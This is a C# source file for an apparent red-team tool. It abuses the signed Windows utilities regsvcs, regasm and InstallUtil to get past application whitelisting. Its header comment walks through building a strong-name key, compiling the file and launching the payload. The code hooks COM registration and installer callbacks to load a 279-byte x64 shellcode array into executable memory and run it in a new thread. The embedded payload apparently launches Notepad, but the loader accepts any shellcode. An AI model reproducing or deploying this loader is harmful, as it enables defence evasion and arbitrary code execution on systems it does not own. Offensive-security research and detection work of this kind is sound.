
using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.EnterpriseServices;


/*
    Author: Casey Smith, Twitter: @subTee
    Customized by: Mariusz B. / mgeeky, <mb@binary-offensive.com>
    License: BSD 3-Clause

    Step 1: Create Your Strong Name Key -> key.snk

        $key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='
        $Content = [System.Convert]::FromBase64String($key)
        Set-Content key.snk -Value $Content -Encoding Byte

    Step 2: Compile source code:
        C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library /out:regsvcs.dll /keyfile:key.snk program.cs

    Step 3: Execute your payload!
        C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe regsvcs.dll 
        C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe regsvcs.dll
        C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe /U regsvcs.dll 
        C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U regsvcs.dll
*/

namespace Program
{
    public class Bypass : ServicedComponent
    {
        public Bypass() 
        { 
        }
        
        // This executes if registration is successful
        [ComRegisterFunction]
        public static void RegisterClass( string key )
        {
            Shellcode.Execute();
        }
        
        // This executes if registration fails
        [ComUnregisterFunction]
        public static void UnRegisterClass( string key )
        {
            Shellcode.Execute();
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class ForInstallUtil : System.Configuration.Install.Installer
    {
        // This executes during InstallUtil /U invocation
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            Shellcode.Execute();
        }
    }
    
    public class Shellcode
    {
        
        [DllImport("kernel32")]
        private static extern IntPtr VirtualAlloc(
            IntPtr lpAddress, UIntPtr dwSize, 
            UInt32 flAllocationType, 
            UInt32 flProtect
        );

        [DllImport("kernel32")]
        private static extern bool VirtualFree(
            IntPtr lpAddress, 
            UInt32 dwSize, 
            UInt32 dwFreeType
        );

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread( 
            UInt32 lpThreadAttributes, 
            UInt32 dwStackSize, 
            IntPtr lpStartAddress, 
            IntPtr param, 
            UInt32 dwCreationFlags, 
            ref UInt32 lpThreadId 
        );

        [DllImport("kernel32")]
        private static extern bool CloseHandle(
            IntPtr hHandle
        );

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject( 
            IntPtr hHandle, 
            UInt32 dwMilliseconds 
        );

        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        private static UInt32 MEM_RELEASE = 0x8000;

        public static void Execute() {

            byte[] payload = new byte[279] {
                0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 
                0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 
                0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 
                0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 
                0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 
                0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 
                0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 
                0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 
                0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 
                0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 
                0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 
                0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 
                0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 
                0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 
                0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 
                0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 
                0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x6e, 0x6f, 0x74, 0x65, 0x70, 
                0x61, 0x64, 0x2e, 0x65, 0x78, 0x65, 0x00
            };

            IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)payload.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(payload, 0, funcAddr, payload.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;

            hThread = CreateThread(0, 0, funcAddr, IntPtr.Zero, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);

            CloseHandle(hThread);
            VirtualFree(funcAddr, 0, MEM_RELEASE);

        }           
    }
}
